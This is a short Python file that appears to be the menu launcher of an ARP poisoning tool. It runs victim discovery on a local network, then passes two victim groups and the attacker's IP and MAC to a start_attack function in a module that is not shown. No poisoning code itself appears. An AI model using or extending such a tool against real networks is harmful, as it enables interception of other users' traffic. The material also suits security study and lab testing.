import os
from config import config

def main():
    from discovery import start_discovery
    from ARP import start_attack
    while True:
        os.system("clear")
        print("1: Start ARP poisoning attack")
        print("2: Quit")

        print()
        choice = input("Press a number: ")

        if choice == "1":
            group1, group2, interface, self_ip, self_mac = start_discovery()

            if len(group1 + group2) < 2:
                input("Not enough victims returned...")
            else:
                start_attack(group1, group2, self_ip, self_mac, interface)
        elif choice == "2":
            break

if __name__ == "__main__":
    main()